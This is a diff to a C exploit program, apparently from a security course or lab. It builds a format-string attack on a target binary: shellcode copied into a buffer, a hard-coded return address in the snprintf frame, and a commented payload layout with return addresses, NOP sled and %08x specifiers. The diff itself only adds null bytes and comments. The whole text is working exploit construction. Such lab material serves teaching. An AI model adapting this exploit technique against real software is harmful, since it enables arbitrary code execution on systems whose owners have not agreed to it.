@@ -88,6 +88,9 @@ int main(void)
 		buf[112 + i] = shellcode[i];
 	}
 
+  buf[252] = '\x00';
+  buf[253] = '\x00';
+  buf[254] = '\x00';
   buf[255] = '\x00';
 
   // Return address to be overwritten: 0x3021f988 (rip within snprintf frame)
@@ -98,7 +101,7 @@ int main(void)
 
   // Encode env to accommodate null bytes
   args[0] = TARGET; 
-  args[1] = ret_addr_1; 
+  args[1] = ret_addr_1;
   args[2] = NULL;
 
   env[0] = "\x00";
@@ -135,6 +138,7 @@ int main(void)
 
 /*
   Desired formatString content:
+
   \x88\xf9\x21\x30 <- return address 1
   \x00\x00\x00\x00
   \x89\xf9\x21\x30 <- return address 2
@@ -150,7 +154,7 @@ int main(void)
   \x90\x90\x90\x90
   \x90\x90\x90\x90
   \x90\x90\x90\x90
-  \x25\x30\x38\x78
+  \x25\x30\x38\x78 <- Specifier string start
   \x25\x30\x38\x78
   \x25\x30\x38\x78
   \x25\x30\x38\x78
